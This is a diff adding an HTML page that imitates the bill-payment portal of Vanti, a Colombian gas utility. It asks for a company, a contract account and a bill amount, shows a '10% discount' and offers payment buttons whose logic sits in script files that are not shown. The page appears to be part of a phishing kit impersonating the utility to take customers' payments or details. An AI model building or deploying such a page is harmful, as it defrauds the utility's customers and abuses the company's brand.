@@ -1,0 +1,82 @@
+<html>
+    <head>
+        <title>Vanti - Similtech</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">        
+        <meta content="es" http-equiv="Content-Language">    
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <link rel="icon" href="img/favicon.ico" type="image/x-icon">
+        <script type="text/javascript" src="js/jquery.js"></script>
+        <link href="css/style.css" rel="stylesheet">
+        <script type="text/javascript" src="js/functions.js"></script>   
+        <script type="text/javascript" src="js/ready.js"></script>    
+    </head>
+</head>
+<body>
+    <img src="img/van.jpg" alt="Imagen de la empresa" style="width: 100%; margin-top: 0px;">
+    <div class="contenido" style="display:;">
+        <img src="img/vanti.jpg" alt="Logo de Vanti" style="width: 100%; margin-top: 0px;">
+
+        <div class="recuadro">
+            <div class="section-title">
+                <center><h3 class="tittle">Consulta y paga tu factura</h3></center>
+            </div>            
+            <div class="section-form">
+                <img src="img/empre.jpg" alt="Imagen de empresa" style="width: 100%; margin-top: 0px; margin-bottom: 6px;">
+                <form class="payment-form" id="formConsulta">
+                    <select name="empresa" id="empresa" class="form form-control custom-input">
+                        <option value="0" selected="" disabled="">Selecciona una opción</option>
+                        <option value="Vanti S.A. E.S.P.">Vanti S.A. E.S.P.</option>
+                        <option value="Vanti - Gas Natural Cundiboyacense S.A. E.S.P.">Vanti - Gas Natural Cundiboyacense S.A. E.S.P.</option>
+                        <option value="Vanti - Gas Natural Nacer S.A. E.S.P.">Vanti - Gas Natural Nacer S.A. E.S.P.</option>
+                        <option value="Vanti - Gas Natural Oriente S.A. E.S.P.">Vanti - Gas Natural Oriente S.A. E.S.P.</option>
+                        <option value="Vanti Soluciones S.A.S.">Vanti Soluciones S.A.S.</option>
+                    </select>
+                    <div class="mt-2">
+                        <img src="img/cuenta.jpg" alt="Imagen de empresa" style="width: 100%; margin-top: 15px; margin-bottom: 6px;">
+                        <input id="cuenta_contrato" inputmode="numeric" type="number" class="form form-control custom-input" placeholder="Ingresa tu cuenta o referencia">
+                    </div>
+                    <div class="mt-2">
+                        <div style="text-align: center; padding: 5px 0px;">
+                            <img src="img/vanti.jpg" alt="Logo de Vanti" style="width: 18%; margin-top: 0px;">
+                        </div>
+                        <input id="valor_factura" inputmode="numeric" type="text" class="form form-control custom-input" placeholder="Valor de tu factura">
+                    </div>
+                </form>
+            </div>
+            <div class="button-container section-form" >
+                <button id="btn-consultar" class="btn-consultar" disabled="">Consultar</button>
+            </div>
+            <br>
+            <div class="resultado-pago section-form" id="resultado-pago">
+                
+            </div>
+        </div>
+        <br>
+        <img src="img/reca.jpg" alt="Imagen de recaudación" style="width: 100%; margin-top: 0px;">
+    </div>
+
+    <div id="detallePago" style="display:none; text-align: center; background-color: #fff; padding: 0px 10px;">
+        <img src="img/vanti.jpg" alt="Logo de Vanti" style="width: 100%; margin-top: 0px;">
+        <h1 style="text-align:center; color: #113455;">Detalles del Pago</h1>
+        <p><strong style="color: #113455;">Empresa:</strong> <span id="empresaPago" style="color: #113455;"></span></p>
+        <p><strong style="color: #113455;">Cuenta de contrato:</strong> <span id="cuentaContratoPago" style="color: #113455;"></span></p>
+        <p><strong style="color: #113455;">Valor de la factura:</strong> <span id="valorFacturaPago" style="color: #113455;"></span></p>
+        <p><strong style="color: #113455;">Valor a pagar (con descuento 10%):</strong> <span id="valorPagar" style="color: #113455;"></span></p>
+        <img src="img/sele.jpg" alt="Imagen de recaudación" style="width: 100%; margin-top: 0px;">
+            <br><br>
+        <!-- Botones de pago -->
+        <div class="button-container">
+            <a href="#" id="btn-trico"><img src="img/boton.jpg" alt="Imagen de recaudación" style="width: 35%; margin-top: 0px;"></a>
+            <a href="#" id="btn-pse"><img src="img/pse.jpg" alt="Imagen de recaudación" style="width: 25%; margin-top: 0px;"></a>
+            
+        </div>
+        <br><br>
+        <img src="img/reca.jpg" alt="Imagen de recaudación" style="width: 100%; margin-top: 0px;">
+    </div>
+</body>
+</html>
